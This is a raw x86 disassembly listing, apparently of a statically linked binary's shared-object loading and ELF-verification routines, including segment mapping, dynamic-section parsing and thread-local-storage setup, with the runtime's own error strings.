mov ebx, dword [var_18h]
cmp eax, 0xffffffff
je 0x807b97c
mov dword [esp], eax
call fcn.08053f20
test ebx, ebx
je 0x807b9a6
mov eax, dword [ebx + 0xc]
test eax, eax
jne 0x807b9cd
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x807b9c4
mov dword [0x80aac58], 0
dec dword [0x80aabf8]
mov dword [esp], ebx
call fcn.08051180
mov eax, dword [var_sp_10h]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [var_sp_18h]
mov edx, dword [var_ch_3]
xor ecx, ecx
mov dword [esp], eax
mov eax, dword [var_4h_3]
call fcn.08081200
mov dword [eax + 0xc], 0
jmp 0x807b998
mov dword [var_ch_2], 0x8093017
mov dword [var_8h_2], 0x30d
mov dword [var_4h_2], str.dl_load.c
mov dword [esp], str.l__l_next____void__0_
call fcn.0805efc0
jmp fcn.0807ba00
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
lea eax, [var_6ch]
push ebx
sub esp, 0xf0
mov dword [var_94h], 0
mov dword [var_80h], 0
mov edi, dword [var_ch_2]
mov dword [var_8h_3], eax
mov eax, dword [var_8h_2]
mov dword [esp], 3
mov dword [var_4h_3], eax
call fcn.08053dc0
test eax, eax
js 0x807c7f9
mov edx, dword [0x80aac58]
test edx, edx
mov dword [var_80h], edx
je 0x807bab2
mov eax, dword [var_6ch_2]
mov edx, dword [var_68h_2]
mov ebx, dword [var_14h_3]
mov esi, dword [var_10h_3]
mov dword [var_9ch], eax
mov dword [var_98h], edx
mov ecx, dword [var_80h_2]
mov edx, dword [ecx + 0x1cc]
mov eax, dword [ecx + 0x1c8]
mov ecx, edx
xor eax, ebx
xor ecx, esi
or ecx, eax
jne 0x807baa5
mov ecx, dword [var_80h_2]
mov eax, dword [ecx + 0x1c0]
mov edx, dword [ecx + 0x1c4]
xor eax, dword [var_9ch]
mov ecx, dword [var_98h]
xor ecx, edx
or ecx, eax
je 0x807c7d8
mov eax, dword [var_80h_2]
mov eax, dword [eax + 0xc]
test eax, eax
mov dword [var_80h_2], eax
jne 0x807ba67
xor eax, eax
test byte [var_4h], 4
jne 0x807c04a
test byte [0x80aac10], 0x40
jne 0x807c7c0
mov eax, dword [var_18h_2]
lea ecx, [edi + 4]
mov ebx, str.cannot_create_shared_object_descriptor
mov dword [var_84h], ecx
mov dword [esp], eax
mov eax, dword [var_bp_4h]
mov edx, dword [var_4h_2]
mov ecx, dword [var_1ch_2]
call fcn.0807ea00
sub esp, 4
mov dword [var_80h], eax
test eax, eax
je 0x807bdc3
mov ebx, dword [var_84h]
mov esi, dword [var_80h]
mov eax, dword [ebx + 0x18]
mov dword [esi + 0x148], eax
movzx eax, word [ebx + 0x10]
mov dword [var_90h], eax
movzx eax, word [ebx + 0x2c]
mov word [esi + 0x14c], ax
movzx edx, word [ebx + 0x2c]
shl edx, 5
mov dword [var_8ch], edx
mov ecx, dword [var_8ch]
mov edx, dword [ebx + 0x1c]
lea eax, [ecx + edx]
cmp eax, dword [edi]
ja 0x807c756
lea edi, [edx + edi + 4]
mov dword [var_88h_2], edi
mov ebx, dword [var_80h]
mov edi, dword [var_88h_2]
mov dword [var_a4h], esp
mov dword [var_a0h_2], 7
mov dword [var_ach], 0
mov byte [var_adh], 0
movzx esi, word [ebx + 0x14c]
movzx edx, si
lea eax, [edx + edx*2 - 3]
shl edx, 5
lea eax, [eax*8 + 0x28]
add edx, edi
sub esp, eax
lea eax, [var_43h]
and eax, 0xfffffff0
cmp edi, edx
mov dword [var_a8h], eax
jae 0x807c43b
mov dword [var_c0h], eax
mov esi, esi
mov eax, dword [edi]
cmp eax, 6
je 0x807c745
ja 0x807c540
cmp eax, 1
je 0x807c45d
cmp eax, 2
je 0x807c442
movzx eax, si
add edi, 0x20
shl eax, 5
add eax, dword [var_88h_2]
cmp edi, eax
jb 0x807bbb0
mov eax, dword [var_ach]
test eax, eax
je 0x807c43b
mov ecx, dword [var_ach]
mov ebx, dword [var_a8h]
lea eax, [ecx + ecx*2]
mov edx, dword [ebx]
lea esi, [ebx + eax*8]
mov eax, dword [esi - 0xc]
sub eax, edx
cmp dword [var_90h_2], 3
mov dword [var_8ch_2], eax
jne 0x807c402
mov eax, dword [ebx + 0x10]
and edx, dword [0x80a95ac]
mov dword [var_sp_10h], eax
mov ecx, dword [var_8h_3]
mov dword [var_8h_3], 0x802
mov dword [var_ch_3], ecx
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
mov eax, dword [var_8ch_2]
mov dword [esp], edx
mov dword [var_4h_4], eax
call fcn.080546d0
mov ecx, dword [var_80h_2]
cmp eax, 0xffffffff
mov edx, eax
mov dword [ecx + 0x194], eax
je 0x807bdb8
mov ecx, dword [var_8ch_2]
lea eax, [ecx + eax]
mov ecx, dword [var_80h_2]
mov dword [ecx + 0x198], eax
sub edx, dword [ebx]
cmp byte [var_adh], 0
mov dword [ecx], edx
jne 0x807c3de
test byte [ebx + 0x14], 4
je 0x807bca0
mov ecx, dword [var_80h_2]
mov eax, dword [ebx + 4]
add eax, dword [ecx]
mov dword [ecx + 0x19c], eax
mov esi, dword [var_80h_2]
mov eax, dword [esi + 0x144]
test eax, eax
jne 0x807bce2
mov eax, dword [var_84h_2]
mov esi, dword [ebx + 0x10]
mov ecx, dword [eax + 0x1c]
cmp esi, ecx
ja 0x807bce2
movzx eax, word [eax + 0x2c]
mov edx, dword [ebx + 4]
mov edi, dword [ebx]
shl eax, 5
sub edx, edi
add edx, esi
lea eax, [eax + ecx]
cmp edx, eax
jb 0x807bce2
mov edx, dword [var_80h_2]
lea eax, [ecx + edi]
sub eax, esi
mov dword [edx + 0x144], eax
mov ecx, dword [ebx + 0xc]
mov edx, dword [ebx + 8]
cmp ecx, edx
jbe 0x807bd54
mov esi, dword [var_80h_2]
mov eax, dword [esi]
lea esi, [edx + eax]
add eax, ecx
mov dword [var_bch], eax
mov eax, dword [0x80aac74]
lea edi, [eax + esi - 1]
neg eax
and edi, eax
cmp dword [var_bch], edi
cmovb edi, dword [var_bch]
cmp edi, esi
jbe 0x807bd48
mov eax, dword [ebx + 0x14]
test al, 2
je 0x807c3aa
mov eax, edi
mov dword [var_4h_4], 0
mov dword [esp], esi
sub eax, esi
mov dword [var_4h_3], eax
call fcn.080536f0
mov eax, dword [ebx + 0x14]
test al, 2
je 0x807c386
cmp dword [var_bch], edi
ja 0x807c33e
mov edx, dword [var_ach]
mov ecx, dword [var_a8h]
add ebx, 0x18
lea eax, [edx + edx*2]
lea eax, [ecx + eax*8]
cmp ebx, eax
jae 0x807bdfe
mov eax, dword [ebx]
cmp dword [ebx + 4], eax
jbe 0x807bc8c
mov eax, dword [ebx + 0x10]
mov dword [var_sp_10h], eax
mov esi, dword [var_8h_3]
mov dword [var_8h_3], 0x812
mov dword [var_ch_3], esi
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
mov eax, dword [ebx + 4]
sub eax, dword [ebx]
mov dword [var_4h_4], eax
mov edx, dword [var_80h_2]
mov eax, dword [ebx]
add eax, dword [edx]
mov dword [esp], eax
call fcn.080546d0
inc eax
jne 0x807bc8c
mov ebx, str.failed_to_map_segment_from_shared_object
mov esp, dword [var_a4h]
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_94h], eax
mov dword [var_sp_10h], ebx
mov edx, dword [var_80h]
mov dword [var_sp_10h], edx
mov ecx, dword [var_sp_10h]
mov dword [var_8h_3], ecx
mov ebx, dword [var_4h_3]
mov dword [var_8h_3], ebx
mov esi, dword [var_8h_3]
mov dword [var_4h_3], esi
mov eax, dword [var_94h]
mov dword [esp], eax
call fcn.0807b960
mov ebx, dword [var_80h]
mov eax, dword [ebx + 0x144]
test eax, eax
je 0x807c2eb
mov ebx, dword [var_80h]
add eax, dword [ebx]
mov dword [ebx + 0x144], eax
mov esi, dword [var_80h]
mov esp, dword [var_a4h]
mov eax, dword [esi + 0x210]
test eax, eax
je 0x807be35
add eax, dword [esi]
mov dword [esi + 0x210], eax
mov eax, dword [var_8h_2]
mov dword [esp], eax
call fcn.08053f20
mov ecx, dword [var_80h]
mov dword [var_8h_2], 0xffffffff
movzx edx, byte [ecx + 0x174]
mov eax, edx
and eax, 3
dec al
je 0x807c2d0
mov ebx, dword [var_80h]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807c2c1
cmp dword [var_90h], 3
mov ebx, str.object_file_has_no_dynamic_section
je 0x807bdd0
mov eax, dword [var_80h]
mov edx, dword [eax]
mov ecx, dword [var_80h]
add dword [ecx + 0x148], edx
test byte [0x80aac10], 0x40
jne 0x807c24a
mov esi, dword [var_80h]
mov ecx, dword [esi + 8]
test ecx, ecx
je 0x807bfbf
mov edx, dword [ecx]
add esi, 0x18
test edx, edx
je 0x807becc
mov edi, 0x6fffffff
cmp edx, 0x21
jg 0x807c1f1
mov dword [esi + edx*4], ecx
add ecx, 8
mov eax, dword [ecx]
test eax, eax
mov edx, eax
jne 0x807beb5
mov eax, dword [var_80h]
mov edx, dword [eax]
test edx, edx
je 0x807bf28
mov eax, dword [esi + 0x10]
test eax, eax
je 0x807bedf
add dword [eax + 4], edx
mov eax, dword [esi + 0xc]
test eax, eax
je 0x807bee9
add dword [eax + 4], edx
mov eax, dword [esi + 0x14]
test eax, eax
je 0x807bef3
add dword [eax + 4], edx
mov eax, dword [esi + 0x18]
test eax, eax
je 0x807befd
add dword [eax + 4], edx
mov eax, dword [esi + 0x1c]
test eax, eax
je 0x807bf07
add dword [eax + 4], edx
mov eax, dword [esi + 0x44]
test eax, eax
je 0x807bf11
add dword [eax + 4], edx
mov eax, dword [esi + 0x5c]
test eax, eax
je 0x807bf1b
add dword [eax + 4], edx
mov eax, dword [esi + 0xc4]
test eax, eax
je 0x807bf28
add dword [eax + 4], edx
mov eax, dword [esi + 0x50]
test eax, eax
je 0x807bf3b
mov eax, dword [eax + 4]
cmp eax, 0x11
jne 0x807c1c7
mov eax, dword [esi + 0x1c]
test eax, eax
je 0x807bf4f
mov eax, dword [esi + 0x24]
cmp dword [eax + 4], 0xc
jne 0x807c1a6
mov eax, dword [esi + 0x44]
test eax, eax
je 0x807bf63
mov eax, dword [esi + 0x4c]
cmp dword [eax + 4], 8
jne 0x807c182
mov edx, dword [esi + 0x78]
test edx, edx
je 0x807bf94
mov eax, dword [edx + 4]
mov ecx, dword [var_80h]
test al, 2
mov dword [ecx + 0x1f0], eax
je 0x807bf7d
mov dword [esi + 0x40], edx
mov ebx, dword [var_80h]
mov eax, dword [ebx + 0x1f0]
test al, 4
je 0x807bf8d
mov dword [esi + 0x58], edx
test al, 8
je 0x807bf94
mov dword [esi + 0x60], edx
mov edx, dword [esi + 0x98]
test edx, edx
je 0x807bfb1
mov eax, dword [edx + 4]
mov ecx, dword [var_80h]
test al, 1
mov dword [ecx + 0x1ec], eax
je 0x807bfb1
mov dword [esi + 0x60], edx
mov edi, dword [esi + 0x74]
test edi, edi
je 0x807bfbf
mov dword [esi + 0x3c], 0
mov ebx, dword [var_80h]
test byte [ebx + 0x1ec], 0x40
jne 0x807c11f
mov eax, dword [var_80h]
mov edx, dword [eax + 0x28]
test edx, edx
jne 0x807c115
mov edx, dword [var_80h]
mov eax, dword [edx + 0x58]
test eax, eax
jne 0x807c08d
mov eax, dword [var_80h]
mov edx, dword [var_68h]
mov ecx, dword [var_80h]
test byte [eax + 0x1ec], 0x20
cmove eax, dword [0x80aac64]
mov dword [0x80aac64], eax
mov eax, dword [var_6ch]
mov dword [ecx + 0x1c4], edx
mov dword [ecx + 0x1c0], eax
mov edx, dword [var_10h_2]
mov eax, dword [var_14h_2]
mov dword [ecx + 0x1c8], eax
mov dword [ecx + 0x1cc], edx
mov eax, dword [0x80a95c8]
not eax
and dword [var_a0h], eax
test byte [var_a0h], 1
jne 0x807c070
mov eax, dword [0x80aac20]
test eax, eax
jne 0x807c052
mov eax, dword [var_80h]
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_80h]
mov edx, dword [eax + 0x50]
test edx, edx
je 0x807c047
mov ecx, eax
mov edx, dword [edx + 4]
mov eax, dword [eax + 0x2c]
add edx, dword [eax + 4]
mov eax, ecx
call fcn.0807b200
jmp 0x807c047
mov eax, dword [var_8h]
mov ebx, str.cannot_enable_executable_stack_as_shared_object_requires
call dword [0x80a95cc]
test eax, eax
mov dword [var_94h], eax
je 0x807c03e
jmp 0x807bdd0
mov ecx, dword [var_80h]
add edx, 0x150
mov eax, dword [ecx + 0x1b4]
cmp edx, dword [eax]
je 0x807bfeb
mov dword [esp], 4
call fcn.08050fe0
mov ebx, dword [var_80h]
test eax, eax
mov dword [ebx + 0x158], eax
mov ebx, str.cannot_create_searchlist
je 0x807bdc3
mov esi, dword [var_80h]
mov dword [eax], esi
mov dword [esi + 0x15c], 1
mov eax, dword [esi + 0x1b0]
lea eax, [eax*4 - 4]
mov dword [var_8h_3], eax
mov eax, dword [esi + 0x1b4]
mov dword [var_4h_3], eax
mov eax, dword [esi + 0x1b4]
add eax, 4
mov dword [esp], eax
call fcn.08053690
mov eax, esi
mov edx, dword [esi + 0x1b4]
add eax, 0x158
mov dword [edx], eax
jmp 0x807bfeb
call fcn.0807e920
jmp 0x807bfdd
mov esi, dword [var_4h]
test esi, esi
jns 0x807bfcf
mov eax, dword [ebx + 0x198]
sub eax, dword [ebx + 0x194]
mov dword [var_4h_3], eax
mov eax, dword [ebx + 0x194]
mov dword [esp], eax
call fcn.08054780
mov eax, dword [ebx + 0x14]
mov ecx, dword [eax + 8]
test ecx, ecx
je 0x807c178
mov esi, dword [var_80h]
test byte [esi + 0x174], 0x80
jne 0x807c168
mov ebx, str.shared_object_cannot_be_dlopen__ed
jmp 0x807bdd0
mov eax, dword [esi + 0x144]
mov dword [esp], eax
call fcn.08051180
jmp 0x807c15e
mov dword [esp], eax
call fcn.08051180
jmp 0x807c152
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x9f
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_19___d_un.d_val__sizeof__Elf32_Rel_
call fcn.0805efc0
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x9b
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_9___d_un.d_val__sizeof__Elf32_Rela_
jmp 0x807c1a1
cmp eax, 7
je 0x807bf3b
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x96
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_20___d_un.d_val__17__info_20___d_un.d_val__7
jmp 0x807c1a1
mov eax, edi
sub eax, edx
cmp eax, 0xf
ja 0x807c209
mov eax, 0x70000021
sub eax, edx
mov dword [esi + eax*4], ecx
jmp 0x807bec1
lea ebx, [edx + edx]
sar ebx, 1
mov eax, ebx
not eax
cmp eax, 2
ja 0x807c220
mov eax, 0x31
sub eax, ebx
jmp 0x807c201
mov eax, 0x6ffffdff
sub eax, edx
cmp eax, 0xb
ja 0x807c233
mov eax, 0x6ffffe34
jmp 0x807c1ff
mov eax, 0x6ffffeff
sub eax, edx
cmp eax, 9
ja 0x807bec1
mov eax, 0x6fffff40
jmp 0x807c1ff
movzx eax, word [ecx + 0x14c]
mov dword [var_2ch], 8
mov dword [var_30h], eax
mov eax, dword [ecx + 0x144]
mov dword [var_24h], 8
mov dword [var_28h], eax
mov eax, dword [ecx + 0x148]
mov dword [var_sp_1ch], 8
mov dword [var_20h], eax
mov ebx, dword [var_8ch]
mov dword [var_sp_14h], 8
mov dword [var_sp_18h], ebx
mov eax, dword [ecx]
mov dword [var_ch_3], 8
mov dword [var_sp_10h], eax
mov eax, dword [ecx + 8]
mov dword [esp], str.__dynamic:_0x_0lx__base:_0x_0lx___size:_0x_0Zx_n____entry:_0x_0lx__phdr:_0x_0lx__phnum:____u_n_n
mov dword [var_4h_3], 8
mov dword [var_8h_3], eax
call fcn.08081c40
jmp 0x807be99
mov esi, dword [var_80h]
mov edx, dword [esi]
add eax, edx
mov dword [esi + 8], eax
jmp 0x807be83
cmp dword [var_90h], 2
jne 0x807be5e
and edx, 0xfffffffc
mov byte [ecx + 0x174], dl
jmp 0x807be5e
mov esi, dword [var_84h]
movzx eax, word [esi + 0x2c]
shl eax, 5
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
je 0x807c334
mov edx, dword [var_84h]
mov esi, dword [var_88h]
mov edi, eax
cld
movzx ecx, word [edx + 0x2c]
shl ecx, 5
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_80h]
or byte [ecx + 0x174], 0x80
mov dword [ecx + 0x144], eax
jmp 0x807be1a
mov ebx, str.cannot_allocate_memory_for_program_header
jmp 0x807bdbd
mov dword [var_sp_10h], 0
mov dword [var_ch_3], 0xffffffff
mov dword [var_8h_3], 0x32
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
sub dword [var_bch], edi
mov eax, dword [var_bch]
mov dword [esp], edi
mov dword [var_4h_4], eax
call fcn.080546d0
inc eax
jne 0x807bd54
mov ebx, str.cannot_map_zero_fill_pages
jmp 0x807bdbd
mov dword [var_4h_3], eax
mov eax, dword [0x80aac74]
mov dword [var_4h_4], eax
mov eax, dword [0x80aac74]
dec eax
not eax
and esi, eax
mov dword [esp], esi
call fcn.080547a0
jmp 0x807bd48
or eax, 2
mov dword [var_4h_3], eax
mov eax, dword [0x80aac74]
mov dword [var_4h_4], eax
mov eax, dword [0x80aac74]
dec eax
not eax
and eax, esi
mov dword [esp], eax
call fcn.080547a0
test eax, eax
jns 0x807bd25
mov ebx, str.cannot_change_memory_protections
jmp 0x807bdbd
mov dword [var_4h_3], 0
mov eax, dword [esi - 0xc]
sub eax, dword [ebx + 4]
mov dword [var_4h_4], eax
mov eax, dword [ebx + 4]
add eax, dword [ecx]
mov dword [esp], eax
call fcn.080547a0
jmp 0x807bc8c
test dword [var_sp_1ch], 0x20000000
je 0x807c42b
mov ecx, dword [var_80h_2]
mov eax, edx
add eax, dword [ecx]
mov dword [ecx + 0x194], eax
add eax, dword [var_8ch_2]
cmp ebx, esi
mov dword [ecx + 0x198], eax
jmp 0x807bd6b
mov ebx, str.cannot_dynamically_load_executable
mov esp, dword [var_a4h_2]
jmp 0x807bdd0
mov ebx, str.object_file_has_no_loadable_segments
jmp 0x807c430
mov eax, dword [edi + 8]
mov edx, dword [var_80h_2]
mov dword [edx + 8], eax
mov eax, dword [edi + 0x14]
shr eax, 3
mov word [edx + 0x14e], ax
jmp 0x807bbd3
mov ebx, dword [0x80aac74]
mov edx, dword [edi + 0x1c]
mov ecx, ebx
mov dword [var_b4h], ebx
dec ecx
test ecx, edx
jne 0x807c535
mov eax, dword [edi + 8]
dec edx
mov dword [var_b8h], eax
sub eax, dword [edi + 4]
test edx, eax
jne 0x807c52b
mov ebx, dword [var_c0h]
not edx
not ecx
inc dword [var_ach]
lea eax, [ebx + 0x18]
mov dword [var_c0h], eax
mov eax, dword [var_b8h]
and edx, eax
mov eax, dword [var_c0h]
mov dword [var_c4h], edx
mov dword [eax - 0x18], edx
mov edx, dword [var_b4h]
mov eax, dword [edi + 0x10]
add eax, dword [edi + 8]
lea eax, [edx + eax - 1]
and eax, ecx
mov ecx, dword [var_c0h]
mov dword [ecx - 0x14], eax
mov eax, dword [edi + 0x10]
add eax, dword [edi + 8]
mov dword [ecx - 0x10], eax
mov eax, dword [edi + 0x14]
add eax, dword [edi + 8]
mov dword [ecx - 0xc], eax
mov eax, dword [edi + 0x1c]
dec eax
not eax
and eax, dword [edi + 4]
cmp dword [var_ach], 1
mov dword [ecx - 8], eax
jbe 0x807c510
mov eax, dword [var_c4h]
cmp dword [ebx - 0x14], eax
je 0x807c510
mov byte [var_adh], 1
mov ecx, dword [edi + 0x18]
mov eax, 0x73516240
and ecx, 7
shl ecx, 2
sar eax, cl
and eax, 0xf
mov dword [ebx + 0x14], eax
jmp 0x807bbd3
mov ebx, str.ELF_load_command_address_offset_not_properly_aligned
jmp 0x807c430
mov ebx, str.ELF_load_command_alignment_not_page_aligned
jmp 0x807c430
nop
cmp eax, 0x6474e551
je 0x807c737
ja 0x807c712
cmp eax, 7
jne 0x807bbd3
mov eax, dword [edi + 0x14]
test eax, eax
je 0x807bbd3
mov edx, dword [var_80h_2]
mov dword [edx + 0x218], eax
mov eax, dword [edi + 0x1c]
mov dword [edx + 0x21c], eax
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x807c700
mov dword [edx + 0x220], 0
mov ebx, dword [var_80h_2]
mov eax, dword [edi + 0x10]
mov dword [ebx + 0x214], eax
mov eax, dword [edi + 8]
mov dword [ebx + 0x210], eax
movzx eax, byte [ebx + 0x174]
and eax, 3
dec al
jne 0x807c5c9
call fcn.08082e40
mov esi, dword [var_80h_2]
mov dword [esi + 0x228], eax
movzx esi, word [esi + 0x14c]
jmp 0x807bbd3
mov eax, dword [0x80aabdc]
test eax, eax
jne 0x807c5af
call fcn.080489d0
test eax, eax
jne 0x807c6e6
xor eax, eax
call fcn.080831f0
test eax, eax
mov dword [var_c8h], eax
je 0x807c6e6
mov edx, dword [var_c8h]
mov eax, dword [0x80a95d0]
lea esi, [var_7ch]
mov ebx, esi
mov dword [edx + 0x10], eax
mov dword [edx], edx
mov dword [edx + 8], edx
movzx eax, byte [var_70h]
mov dword [var_7ch], 0xffffffff
mov dword [var_78h], edx
mov dword [var_74h], 0xfffff
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_70h], al
mov eax, 0xf3
and dword [var_70h], 0x7f
int 0x80
test eax, eax
jne 0x807c68c
mov eax, dword [var_7ch]
lea eax, [eax*8 + 3]
mov gs, eax
xor eax, eax
test eax, eax
mov ebx, eax
jne 0x807c66d
mov ebx, dword [var_80h_2]
mov eax, dword [0x80aabd8]
movzx esi, word [ebx + 0x14c]
inc eax
mov dword [0x80aabd8], eax
mov dword [ebx + 0x228], eax
jmp 0x807bbd3
mov eax, dword [var_c8h]
mov edx, 1
mov dword [var_94h_2], 0
call fcn.08083210
jmp 0x807c430
cmp dword [0x80aac6c], 0x20362
jbe 0x807c6dc
movzx eax, byte [var_70h]
mov dword [var_7ch], 0
mov ebx, 1
mov edx, 0x10
mov ecx, esi
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_70h], al
mov eax, 0x7b
and dword [var_70h], 0x7f
int 0x80
test eax, eax
mov edx, str.cannot_set_up_LDT_for_thread_local_storage_n
jne 0x807c6d5
mov eax, 7
mov gs, eax
xor edx, edx
mov eax, edx
jmp 0x807c647
mov eax, str.kernel_too_old_for_thread_local_storage_support_n
jmp 0x807c647
mov ebx, str.cannot_allocate_TLS_data_structures_for_initial_thread
mov dword [var_94h_2], 0xc
jmp 0x807c430
lea esi, [esi]
dec eax
mov ecx, dword [var_80h_2]
and eax, dword [edi + 8]
mov dword [ecx + 0x220], eax
jmp 0x807c58c
cmp eax, 0x6474e552
jne 0x807bbd3
mov eax, dword [edi + 8]
mov edx, dword [var_80h_2]
mov dword [edx + 0x22c], eax
mov eax, dword [edi + 0x14]
mov dword [edx + 0x230], eax
jmp 0x807bbd3
mov eax, dword [edi + 0x18]
mov dword [var_a0h_2], eax
jmp 0x807bbd3
mov eax, dword [edi + 8]
mov ecx, dword [var_80h_2]
mov dword [ecx + 0x144], eax
jmp 0x807bbd3
mov eax, dword [var_8ch]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea ebx, [var_43h]
and ebx, 0xfffffff0
mov dword [var_88h], ebx
mov dword [var_4h_3], 0
mov esi, dword [var_84h]
mov eax, dword [esi + 0x1c]
mov dword [var_4h_4], eax
mov eax, dword [var_8h_2]
mov dword [esp], eax
call fcn.08090150
mov edx, dword [var_8ch]
mov dword [var_4h_4], ebx
mov ebx, str.cannot_read_file_data
mov dword [var_4h_3], edx
mov ecx, dword [var_8h_2]
mov dword [esp], ecx
call fcn.08053f70
cmp eax, dword [var_8ch]
jne 0x807bdc3
jmp 0x807bb4d
mov edx, dword [var_4h_2]
mov dword [esp], str.file_s___generating_link_map_n
mov dword [var_4h_3], edx
call fcn.08081c40
jmp 0x807bacb
mov ebx, dword [var_8h_3]
mov dword [esp], ebx
call fcn.08053f20
mov esi, dword [var_sp_10h]
mov dword [esp], esi
call fcn.08051180
mov edx, dword [var_4h_3]
mov eax, dword [var_80h_2]
jmp 0x807c069
mov ebx, str.cannot_stat_shared_object
jmp 0x807bdc3
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov dword [var_14h], 1
mov eax, dword [0x80aa9f0]
add eax, dword [0x80aa9fc]
mov edi, dword [arg_8h]
mov dword [var_10h], esp
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
mov dword [esp], str._search_path
lea esi, [var_1bh]
call fcn.08081c40
mov eax, dword [edi]
and esi, 0xfffffff0
test eax, eax
je 0x807c85a
mov edx, dword [var_ch]
cmp dword [eax + 4], edx
je 0x807c8ac
mov eax, dword [var_14h]
test eax, eax
je 0x807c897
mov eax, dword [var_14h]
cmp byte [eax], 0
jne 0x807c892
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov edx, dword [var_ch]
mov dword [esp], str._t_t__s_from_file__s__n
mov dword [var_4h], edx
call fcn.08081c70
mov esp, dword [var_10h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
jmp 0x807c870
mov eax, dword [var_ch]
mov dword [esp], str._t_t__s__n
mov dword [var_4h], eax
call fcn.08081c70
jmp 0x807c887
mov eax, dword [eax + 0x10]
xor ebx, ebx
mov dword [var_8h], eax
mov eax, dword [edi]
mov eax, dword [eax + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08053740
mov edx, dword [0x80aa9ec]
mov dword [var_18h], eax
cmp ebx, edx
jae 0x807c941
mov eax, dword [edi]
cmp dword [eax + ebx*4 + 0x14], 1
je 0x807c93c
mov eax, dword [0x80aa9e8]
mov eax, dword [eax + ebx*8 + 4]
mov dword [var_8h], eax
mov eax, dword [0x80aa9e8]
mov eax, dword [eax + ebx*8]
mov dword [var_4h], eax
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08053740
cmp eax, esi
mov edx, eax
je 0x807c964
lea eax, [esi + 1]
cmp edx, eax
je 0x807c95f
mov byte [edx - 1], 0
mov dword [var_4h], esi
mov eax, 0x80a37bd
mov edx, 0x80a37be
mov ecx, dword [var_14h_2]
test ecx, ecx
cmove edx, eax
mov dword [esp], edx
call fcn.08081c70
mov dword [var_14h_2], 0
mov edx, dword [0x80aa9ec]
inc ebx
cmp ebx, edx
jb 0x807c8d3
add edi, 4
mov eax, dword [edi]
test eax, eax
je 0x807c85a
mov edx, dword [var_ch]
cmp dword [eax + 4], edx
je 0x807c8ac
jmp 0x807c85a
cmp byte [esi], 0x2f
jne 0x807c90d
mov byte [edx], 0
jmp 0x807c911
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_8h]
mov dword [var_34h], 0
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08053ec0
mov dword [var_30h], eax
inc eax
je 0x807ca75
call fcn.08048b20
mov ecx, dword [var_30h]
mov edx, dword [arg_ch]
mov dword [eax], 0
mov ebx, eax
mov dword [var_8h], 0x200
add edx, 4
mov dword [esp], ecx
mov dword [var_38h], edx
mov dword [var_4h], edx
call fcn.08053f70
mov esi, dword [arg_ch]
cmp eax, 0x33
mov dword [esi], eax
jle 0x807cc80
mov esi, dword [var_38h]
mov edi, 0x80a35ff
mov ecx, 9
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807cc0b
mov esi, dword [var_38h]
cmp dword [esi + 0x14], 1
jne 0x807cc01
mov edi, dword [var_38h]
cmp word [edi + 0x12], 3
jne 0x807caf0
movzx eax, word [edi + 0x10]
cmp eax, 3
jne 0x807cbee
mov eax, dword [var_38h]
cmp word [eax + 0x2a], 0x20
jne 0x807cbe4
mov edx, dword [var_38h]
mov edi, dword [arg_ch]
movzx ecx, word [edx + 0x2c]
mov edx, dword [edx + 0x1c]
movzx ebx, cx
shl ebx, 5
lea eax, [ebx + edx]
cmp eax, dword [edi]
ja 0x807cb8f
lea edx, [edx + edi + 4]
mov dword [var_3ch], edx
mov ebx, dword [var_3ch]
movzx eax, cx
shl eax, 5
lea eax, [eax + ebx]
cmp ebx, eax
jae 0x807ca75
lea esi, [esi]
cmp dword [ebx], 4
je 0x807ca80
movzx eax, cx
add ebx, 0x20
shl eax, 5
add eax, dword [var_3ch]
cmp ebx, eax
jb 0x807ca60
mov eax, dword [var_30h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp dword [ebx + 0x10], 0x20
jne 0x807ca65
cmp dword [ebx + 0x1c], 3
jbe 0x807ca65
mov edx, dword [ebx + 4]
mov ecx, dword [arg_ch]
lea eax, [edx + 0x20]
cmp eax, dword [ecx]
ja 0x807cb12
lea edx, [edx + ecx + 4]
mov dword [var_40h], edx
mov esi, dword [var_40h]
mov edx, 0x80a3608
mov eax, 0x10
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807cabf
mov edi, dword [var_38h]
movzx ecx, word [edi + 0x2c]
jmp 0x807ca65
mov edx, dword [var_40h]
mov ecx, dword [var_40h]
movzx eax, byte [edx + 0x14]
mov ebx, dword [ecx + 0x10]
movzx edx, byte [edx + 0x18]
shl eax, 8
add eax, edx
movzx edx, byte [ecx + 0x1c]
shl eax, 8
add eax, edx
test ebx, ebx
jne 0x807caf0
